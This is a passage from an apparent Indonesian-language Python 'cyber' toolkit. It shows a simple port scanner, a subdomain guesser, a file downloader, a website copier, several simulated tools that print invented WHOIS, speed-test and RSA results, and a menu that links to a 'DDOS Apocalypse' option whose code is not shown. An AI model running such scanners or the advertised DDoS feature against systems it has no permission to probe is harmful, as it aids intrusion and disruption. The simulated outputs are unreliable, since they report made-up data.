        print(f"{Warna.CYAN}SHA256 : {hashlib.sha256(teks.encode()).hexdigest()}{Warna.RESET}")
        print(f"{Warna.CYAN}Base64 : {base64.b64encode(teks.encode()).decode()}{Warna.RESET}")

def port_scanner():
    print(f"\n{Warna.KUNING_TERANG}📡 PORT SCANNER{Warna.RESET}")
    target = input(f"{Warna.CYAN}Target IP/Domain: {Warna.RESET}")
    
    try:
        ip = socket.gethostbyname(target)
        print(f"{Warna.CYAN}Scanning {ip}...{Warna.RESET}")
        
        common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        
        print(f"\n{Warna.HIJAU}Hasil Scan:{Warna.RESET}")
        for port in common_ports[:10]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    print(f"{Warna.HIJAU}✓ Port {port}: OPEN{Warna.RESET}")
                else:
                    print(f"{Warna.MERAH}✗ Port {port}: CLOSED{Warna.RESET}")
                sock.close()
            except:
                pass
            time.sleep(0.1)
    except Exception as e:
        print(f"{Warna.MERAH}Error: {e}{Warna.RESET}")

def dns_lookup():
    print(f"\n{Warna.KUNING_TERANG}🌐 DNS LOOKUP{Warna.RESET}")
    domain = input(f"{Warna.CYAN}Domain: {Warna.RESET}")
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Warna.HIJAU}IP Address: {ip}{Warna.RESET}")
        
        try:
            host = socket.gethostbyaddr(ip)
            print(f"{Warna.CYAN}Hostname: {host[0]}{Warna.RESET}")
        except:
            pass
    except:
        print(f"{Warna.MERAH}Domain tidak valid!{Warna.RESET}")

def user_agent_generator():
    print(f"\n{Warna.KUNING_TERANG}📱 USER AGENT GENERATOR{Warna.RESET}")
    
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    
    for i in range(3):
        print(f"{Warna.CYAN}{i+1}. {random.choice(uas)}{Warna.RESET}")

def file_encryptor():
    print(f"\n{Warna.KUNING_TERANG}📦 FILE ENCRYPTOR{Warna.RESET}")
    teks = input(f"{Warna.CYAN}Masukkan teks: {Warna.RESET}")
    
    key = random.randint(1, 255)
    encrypted = ''.join(chr(ord(c) ^ key) for c in teks)
    encrypted_b64 = base64.b64encode(encrypted.encode()).decode()
    
    print(f"\n{Warna.HIJAU}Key: {key}{Warna.RESET}")
    print(f"{Warna.CYAN}Encrypted: {encrypted_b64}{Warna.RESET}")

def subdomain_finder():
    print(f"\n{Warna.KUNING_TERANG}🌍 SUBDOMAIN FINDER{Warna.RESET}")
    domain = input(f"{Warna.CYAN}Domain: {Warna.RESET}")
    
    subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'api', 'dev', 'test']
    
    print(f"\n{Warna.HIJAU}Mencari...{Warna.RESET}")
    for sub in subs:
        try:
            subdomain = f"{sub}.{domain}"
            ip = socket.gethostbyname(subdomain)
            print(f"{Warna.HIJAU}✓ {subdomain} -> {ip}{Warna.RESET}")
        except:
            print(f"{Warna.MERAH}✗ {subdomain}{Warna.RESET}")
        time.sleep(0.1)

def email_spoof_check():
    print(f"\n{Warna.KUNING_TERANG}📧 EMAIL SPOOF CHECK{Warna.RESET}")
    email = input(f"{Warna.CYAN}Email: {Warna.RESET}")
    
    if '@' in email:
        user, domain = email.split('@')
        print(f"\n{Warna.HIJAU}Analisis:{Warna.RESET}")
        print(f"{Warna.CYAN}Username: {user}{Warna.RESET}")
        print(f"{Warna.CYAN}Domain  : {domain}{Warna.RESET}")
        
        trusted = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        if domain in trusted:
            print(f"{Warna.HIJAU}✓ Domain terpercaya{Warna.RESET}")
        else:
            print(f"{Warna.KUNING}⚠ Domain tidak dikenal{Warna.RESET}")
    else:
        print(f"{Warna.MERAH}Format email salah!{Warna.RESET}")

def link_analyzer():
    print(f"\n{Warna.KUNING_TERANG}🔗 LINK ANALYZER{Warna.RESET}")
    url = input(f"{Warna.CYAN}URL: {Warna.RESET}")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed = urlparse(url)
    
    print(f"\n{Warna.HIJAU}Hasil:{Warna.RESET}")
    print(f"{Warna.CYAN}Scheme  : {parsed.scheme}{Warna.RESET}")
    print(f"{Warna.CYAN}Domain  : {parsed.netloc}{Warna.RESET}")
    print(f"{Warna.CYAN}Path    : {parsed.path}{Warna.RESET}")
    
    if parsed.scheme == 'https':
        print(f"{Warna.HIJAU}✓ Menggunakan HTTPS (aman){Warna.RESET}")
    else:
        print(f"{Warna.MERAH}✗ Menggunakan HTTP (tidak aman){Warna.RESET}")

def whois_lookup():
    print(f"\n{Warna.KUNING_TERANG}🔍 WHOIS LOOKUP (Simulasi){Warna.RESET}")
    domain = input(f"{Warna.CYAN}Domain: {Warna.RESET}")
    
    print(f"\n{Warna.HIJAU}WHOIS Information:{Warna.RESET}")
    print(f"{Warna.CYAN}Domain      : {domain}{Warna.RESET}")
    print(f"{Warna.CYAN}Registrar   : Namecheap, Inc.{Warna.RESET}")
    print(f"{Warna.CYAN}Created     : 2020-01-01{Warna.RESET}")
    print(f"{Warna.CYAN}Expires     : 2030-01-01{Warna.RESET}")

def network_speed_test():
    print(f"\n{Warna.KUNING_TERANG}📊 NETWORK SPEED TEST (Simulasi){Warna.RESET}")
    progress_bar(1, "Mengukur")
    
    download = random.randint(10, 100)
    upload = random.randint(5, 50)
    ping = random.randint(10, 100)
    
    print(f"\n{Warna.HIJAU}Download: {download} Mbps{Warna.RESET}")
    print(f"{Warna.HIJAU}Upload  : {upload} Mbps{Warna.RESET}")
    print(f"{Warna.HIJAU}Ping    : {ping} ms{Warna.RESET}")

def rsa_key_generator():
    print(f"\n{Warna.KUNING_TERANG}🔐 RSA KEY GENERATOR (Simulasi){Warna.RESET}")
    bits = input(f"{Warna.CYAN}Key size (1024/2048/4096): {Warna.RESET}") or '2048'
    
    progress_bar(1, f"Generating {bits}-bit key")
    print(f"\n{Warna.HIJAU}RSA Key pair generated!{Warna.RESET}")

def file_downloader():
    print(f"\n{Warna.KUNING_TERANG}📁 FILE DOWNLOADER{Warna.RESET}")
    url = input(f"{Warna.CYAN}URL file: {Warna.RESET}")
    filename = input(f"{Warna.CYAN}Nama file: {Warna.RESET}") or f"download_{int(time.time())}.bin"
    
    try:
        print(f"{Warna.KUNING}Downloading...{Warna.RESET}")
        response = requests.get(url, stream=True, timeout=5)
        if response.status_code == 200:
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=1024):
                    f.write(chunk)
            print(f"{Warna.HIJAU}✓ Download selesai: {filename}{Warna.RESET}")
        else:
            print(f"{Warna.MERAH}Error: HTTP {response.status_code}{Warna.RESET}")
    except:
        print(f"{Warna.MERAH}Download gagal!{Warna.RESET}")

def website_copier():
    print(f"\n{Warna.KUNING_TERANG}🌍 WEBSITE COPIER{Warna.RESET}")
    url = input(f"{Warna.CYAN}URL: {Warna.RESET}")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        print(f"{Warna.KUNING}Copying...{Warna.RESET}")
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            filename = f"copy_{int(time.time())}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"{Warna.HIJAU}✓ Tersimpan: {filename}{Warna.RESET}")
        else:
            print(f"{Warna.MERAH}Error: HTTP {response.status_code}{Warna.RESET}")
    except:
        print(f"{Warna.MERAH}Gagal mengcopy!{Warna.RESET}")

def metadata_extractor():
    print(f"\n{Warna.KUNING_TERANG}🔍 METADATA EXTRACTOR{Warna.RESET}")
    
    print(f"{Warna.CYAN}1. Extract dari teks{Warna.RESET}")
    print(f"{Warna.CYAN}2. Extract dari file{Warna.RESET}")
    pilih = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}")
    
    if pilih == '1':
        teks = input(f"{Warna.CYAN}Masukkan teks: {Warna.RESET}")
        print(f"\n{Warna.HIJAU}Metadata:{Warna.RESET}")
        print(f"{Warna.CYAN}Panjang   : {len(teks)} karakter{Warna.RESET}")
        print(f"{Warna.CYAN}Kata      : {len(teks.split())} kata{Warna.RESET}")
        print(f"{Warna.CYAN}MD5       : {hashlib.md5(teks.encode()).hexdigest()}{Warna.RESET}")
    
    elif pilih == '2':
        filename = input(f"{Warna.CYAN}Nama file: {Warna.RESET}")
        if os.path.exists(filename):
            stat = os.stat(filename)
            print(f"\n{Warna.HIJAU}Metadata:{Warna.RESET}")
            print(f"{Warna.CYAN}Nama   : {filename}{Warna.RESET}")
            print(f"{Warna.CYAN}Ukuran : {stat.st_size} bytes{Warna.RESET}")
            print(f"{Warna.CYAN}Dibuat : {datetime.datetime.fromtimestamp(stat.st_ctime)}{Warna.RESET}")
        else:
            print(f"{Warna.MERAH}File tidak ditemukan!{Warna.RESET}")

def cyber_tools():
    print(f"\n{Warna.UNGU_TERANG}⚡ CYBER TOOLS{Warna.RESET}")
    print(f"{Warna.CYAN}1. MAC Generator{Warna.RESET}")
    print(f"{Warna.CYAN}2. Phone Generator{Warna.RESET}")
    print(f"{Warna.CYAN}3. Email Generator{Warna.RESET}")
    
    pilih = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}")
    
    if pilih == '1':
        mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
        print(f"{Warna.HIJAU}MAC: {mac.upper()}{Warna.RESET}")
    elif pilih == '2':
        phone = f"08{random.randint(100000000, 999999999)}"
        print(f"{Warna.HIJAU}Phone: {phone}{Warna.RESET}")
    elif pilih == '3':
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
        email = f"user{random.randint(1000,9999)}@{random.choice(domains)}"
        print(f"{Warna.HIJAU}Email: {email}{Warna.RESET}")

# ========== KALKULATOR ==========
def kalkulator():
    print(f"\n{Warna.KUNING}🧮 KALKULATOR CYBER{Warna.RESET}")
    print(f"{Warna.DIM}Contoh: 5+3, 10*2, 100/4{Warna.RESET}")
    
    try:
        expr = input(f"{Warna.CYAN}Masukkan operasi: {Warna.RESET}")
        expr = expr.replace(' ', '')
        allowed = set('0123456789+-*/.')
        
        if all(c in allowed or c.isdigit() for c in expr):
            result = eval(expr)
            print(f"{Warna.HIJAU}Hasil: {expr} = {result}{Warna.RESET}")
        else:
            print(f"{Warna.MERAH}Operasi tidak valid!{Warna.RESET}")
    except Exception as e:
        print(f"{Warna.MERAH}Error: {e}{Warna.RESET}")

# ========== CEK KONEKSI ==========
def cek_koneksi():
    print(f"\n{Warna.BIRU}🌐 CEK KONEKSI{Warna.RESET}")
    progress_bar(1, "Mengecek")
    
    sites = [('Google', '8.8.8.8'), ('Cloudflare', '1.1.1.1')]
    
    for name, target in sites:
        try:
            if os.name == 'posix':
                result = subprocess.run(['ping', '-c', '1', '-W', '2', target], 
                                      capture_output=True, timeout=3)
            else:
                result = subprocess.run(['ping', '-n', '1', '-w', '2000', target],
                                      capture_output=True, timeout=3)
            
            if result.returncode == 0:
                print(f"{Warna.HIJAU}✓ {name}: Terhubung{Warna.RESET}")
            else:
                print(f"{Warna.MERAH}✗ {name}: Gagal{Warna.RESET}")
        except:
            print(f"{Warna.MERAH}✗ {name}: Timeout{Warna.RESET}")

# ========== CATATAN MANAGER ==========
def catatan_manager():
    print(f"\n{Warna.UNGU}📝 CATATAN MANAGER{Warna.RESET}")
    
    while True:
        print(f"\n{Warna.CYAN}1. Buat catatan{Warna.RESET}")
        print(f"{Warna.CYAN}2. Lihat catatan{Warna.RESET}")
        print(f"{Warna.CYAN}3. Hapus catatan{Warna.RESET}")
        print(f"{Warna.CYAN}0. Kembali{Warna.RESET}")
        
        pilihan = input(f"{Warna.KUNING}Pilih: {Warna.RESET}")
        
        if pilihan == '1':
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            nama_file = f"catatan_{timestamp}.txt"
            
            print(f"{Warna.CYAN}Ketik catatan (ketik 'SELESAI'):{Warna.RESET}")
            lines = []
            while True:
                line = input()
                if line.upper() == 'SELESAI':
                    break
                lines.append(line)
            
            if lines:
                with open(nama_file, 'w') as f:
                    f.write('\n'.join(lines))
                print(f"{Warna.HIJAU}✓ Tersimpan: {nama_file}{Warna.RESET}")
        
        elif pilihan == '2':
            files = [f for f in os.listdir('.') if f.startswith('catatan_')]
            if files:
                print(f"{Warna.CYAN}Daftar:{Warna.RESET}")
                for i, f in enumerate(files, 1):
                    print(f"{Warna.KUNING}{i}. {f}{Warna.RESET}")
                
                idx = input(f"{Warna.CYAN}Pilih nomor: {Warna.RESET}")
                try:
                    idx = int(idx) - 1
                    if 0 <= idx < len(files):
                        with open(files[idx], 'r') as f:
                            print(f"\n{Warna.PUTIH}{f.read()}{Warna.RESET}")
                except:
                    print(f"{Warna.MERAH}Error!{Warna.RESET}")
            else:
                print(f"{Warna.KUNING}Tidak ada catatan{Warna.RESET}")
        
        elif pilihan == '3':
            files = [f for f in os.listdir('.') if f.startswith('catatan_')]
            if files:
                print(f"{Warna.CYAN}Daftar:{Warna.RESET}")
                for i, f in enumerate(files, 1):
                    print(f"{Warna.KUNING}{i}. {f}{Warna.RESET}")
                
                idx = input(f"{Warna.MERAH}Hapus nomor: {Warna.RESET}")
                try:
                    idx = int(idx) - 1
                    if 0 <= idx < len(files):
                        os.remove(files[idx])
                        print(f"{Warna.HIJAU}✓ Terhapus{Warna.RESET}")
                except:
                    print(f"{Warna.MERAH}Error!{Warna.RESET}")
            else:
                print(f"{Warna.KUNING}Tidak ada catatan{Warna.RESET}")
        
        elif pilihan == '0':
            break

# ========== RANDOM QUOTE ==========
def random_quote():
    quotes = [
        ("Code is like humor. When you have to explain it, it's bad.", "Cory House"),
        ("Talk is cheap. Show me the code.", "Linus Torvalds"),
        ("First, solve the problem. Then, write the code.", "John Johnson"),
        ("YANZ XITERZ - The Last Cyber Warrior", "Cyber"),
        ("With great power comes great responsibility.", "Uncle Ben"),
    ]
    
    quote, author = random.choice(quotes)
    print(f"\n{Warna.CYAN}💭 RANDOM QUOTE{Warna.RESET}\n")
    print(f"{Warna.KUNING}\"{quote}\"{Warna.RESET}")
    print(f"{Warna.DIM}— {author}{Warna.RESET}")

# ========== MAIN FUNCTION ==========
def main():
    try:
        # Install requests if needed
        try:
            import requests
        except ImportError:
            print("Installing requests...")
            os.system('pip install requests')
            time.sleep(2)
        
        # Verifikasi pengguna
        ok, level = verifikasi_pengguna()
        if not ok:
            return
        
        # Main loop
        while True:
            tampilkan_banner(level)
            cek_sistem()
            tampilkan_menu(level)
            
            pilihan = input(f"\n{Warna.KUNING_TERANG}Pilih [0-25]: {Warna.RESET}")
            
            # Menu 1-5 (Basic)
            if pilihan == '1':
                clear_screen()
                tampilkan_banner(level)
                cek_sistem()
                input("\nTekan Enter...")
            
            elif pilihan == '2':
                clear_screen()
                kalkulator()
                input("\nTekan Enter...")
            
            elif pilihan == '3':
                clear_screen()
                cek_koneksi()
                input("\nTekan Enter...")
            
            elif pilihan == '4':
                clear_screen()
                catatan_manager()
            
            elif pilihan == '5':
                clear_screen()
                random_quote()
                input("\nTekan Enter...")
            
            # DDOS Apocalypse
            elif pilihan == '6':
                ddos_apocalypse_menu(level)
            
            # OSINT
            elif pilihan == '7':
                osint_menu(level)
            
            # Admin Panel (Developer only)
            elif pilihan == '8' and level == 'developer':
                admin_panel()
                input("\nTekan Enter...")
            
            # Mini Games (Developer only)
            elif pilihan == '9' and level == 'developer':
                mini_games()
                input("\nTekan Enter...")
            
            # Cyber Tools (semua bisa akses)
            elif pilihan == '10':
                clear_screen()
                password_generator()
                input("\nTekan Enter...")
            
            elif pilihan == '11':
                clear_screen()
                hash_generator()
                input("\nTekan Enter...")
            
            elif pilihan == '12':
                clear_screen()
                file_encryptor()
                input("\nTekan Enter...")
            
            elif pilihan == '13':
                clear_screen()
                port_scanner()
                input("\nTekan Enter...")
            
            elif pilihan == '14' and level == 'developer':
                clear_screen()
                subdomain_finder()
                input("\nTekan Enter...")
            
            elif pilihan == '15' and level == 'developer':
                clear_screen()
                email_spoof_check()
                input("\nTekan Enter...")
            
            elif pilihan == '16' and level == 'developer':
                clear_screen()
                link_analyzer()
                input("\nTekan Enter...")
            
            elif pilihan == '17':
                clear_screen()
                user_agent_generator()
                input("\nTekan Enter...")
            
            elif pilihan == '18':
                clear_screen()
                dns_lookup()
                input("\nTekan Enter...")
            
            elif pilihan == '19' and level == 'developer':
                clear_screen()
                whois_lookup()
                input("\nTekan Enter...")
            
            elif pilihan == '20' and level == 'developer':
                clear_screen()
                network_speed_test()
                input("\nTekan Enter...")
            
            elif pilihan == '21' and level == 'developer':
                clear_screen()
                rsa_key_generator()
                input("\nTekan Enter...")
            
            elif pilihan == '22' and level == 'developer':
                clear_screen()
                file_downloader()
                input("\nTekan Enter...")
            
            elif pilihan == '23' and level == 'developer':
                clear_screen()
                website_copier()
                input("\nTekan Enter...")
            
            elif pilihan == '24' and level == 'developer':
                clear_screen()
                metadata_extractor()
                input("\nTekan Enter...")
            
            elif pilihan == '25' and level == 'developer':
                clear_screen()
                cyber_tools()
                input("\nTekan Enter...")
            
            # Keluar
            elif pilihan == '0':
                print(f"\n{Warna.HIJAU_TERANG}Terima kasih! Sampai jumpa!{Warna.RESET}")
                break
            
            else:
                print(f"{Warna.MERAH}Pilihan tidak valid!{Warna.RESET}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{Warna.KUNING}Program dihentikan{Warna.RESET}")
    except Exception as e:
        print(f"\n{Warna.MERAH}Fatal Error: {e}{Warna.RESET}")
        time.sleep(3)

if __name__ == "__main__":
    main() 